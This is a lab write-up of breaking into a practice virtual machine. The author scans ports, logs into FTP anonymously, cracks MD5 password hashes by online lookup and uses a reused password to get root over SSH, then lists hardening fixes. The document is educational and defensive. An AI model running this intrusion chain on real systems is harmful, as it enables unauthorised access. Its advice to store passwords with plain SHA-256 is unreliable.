# Hack the Box I

We are presented with a virtual machine and no additional information. Our goal is to gain root privileges on the machine.

## Vulnerability

First we check weather the machine has any exposed ports.

```bash
$ nmap 192.168.57.2
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-08 17:44 CET
Nmap scan report for 192.168.57.2
Host is up (0.00023s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 3.01 seconds
```

Indeed we find that there is an ftp server running on port 21. We connect to the ftp server and try to login anonymously.

```bash
$ ftp 192.168.57.2
Connected to 192.168.57.2.
220 (vsFTPd 3.0.5)
Name (192.168.57.2:localuser): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Surprisingly we are able to do so without any problems. Next we list the files on the server.

```bash
ftp> ls
229 Entering Extended Passive Mode (|||24476|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             173 Mar 08 14:07 users.txt
226 Directory send OK.
ftp>
```

We find a file called `users.txt` which we download.

```bash
ftp> get users.txt
local: users.txt remote: users.txt
229 Entering Extended Passive Mode (|||35079|)
150 Opening BINARY mode data connection for users.txt (173 bytes).
100% |***********************************************************************|   173        1.42 MiB/s    00:00 ETA
226 Transfer complete.
173 bytes received in 00:00 (213.31 KiB/s)
ftp>
```

The file contains the following four lines:

```
obiwan::::5f4dcc3b5aa765d61d8327deb882cf99
anakin::::4aedd405e0a893d495bd8f02358a0d01
yoda::::765e43ee45ef873fc6fec2d869d0308a
palpatine::::4034a346ccee15292d823416f7510a2f
```

The content seems to be a list of users and their hashed passwords. We parse the hashes to a [hash identifier](https://hashes.com/en/tools/hash_identifier) which tells us that the hashes are MD5 hashes and even gives us the plaintext passwords.

```
5f4dcc3b5aa765d61d8327deb882cf99 - password - Possible algorithms: MD5
4aedd405e0a893d495bd8f02358a0d01 - iamyourfather - Possible algorithms: MD5
765e43ee45ef873fc6fec2d869d0308a - maytheforcebewithyou - Possible algorithms: MD5
4034a346ccee15292d823416f7510a2f - evil - Possible algorithms: MD5
```

Next we ssh into the server with the given user credentials to find that the password of the first user matches the password of the superuser.

```bash
$ ssh obiwan@192.168.57.2
obiwan@192.168.57.2's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-67-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Mar  8 13:52:01 2023 from 192.168.57.1
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
$ sudo -i
[sudo] password for obiwan:
#
```

With gaining root privileges we have successfully hacked the box.

## Fixing the vulnerability

### 1. Do not allow anonymous logins

If not absolutely necessary, do not allow anonymous logins to your ftp server. To turn off anonymous logins (which are off by default) add the following line to your `/etc/vsftpd.conf` file.

```bash
anonymous_enable=NO
```

### 2. Do not store user credentials yourself (not implemented in the secured version, because then I couldn't show 3)

Be it a sticky note or a weakly hashed password file, do not store user credentials yourself. Instead use a service like [Keycloak](https://www.keycloak.org/) to manage user credentials.

### 3. Do not use weak encryption

MD5 is a weak encryption algorithm by todays standards. Use a stronger algorithm like SHA-256 or SHA-512. Also consider using salt and pepper to further increase the security of your passwords.

### 4. Do not use weak passwords

Even with a weak encryption algorithm, a strong password can still be very hard to crack. The 'decryption' of the hash was only possible because the passwords were already precomputed and stored in a database. If you use a strong password, the attacker will have to compute the hash themselves which even with md5 takes some time. The password `7?^{?JR6ux/9r4H"` for example has the hash `975cfeae7e88982a72192ed45ddd49e5` which is identified correctly by the site as md5 but has not been precomputed, so it doens't show the plaintext password.

### 5. Don't allow ssh login via password

The ssh server should only allow login via public key. This way the attacker cannot connect to your server even if they have the password.
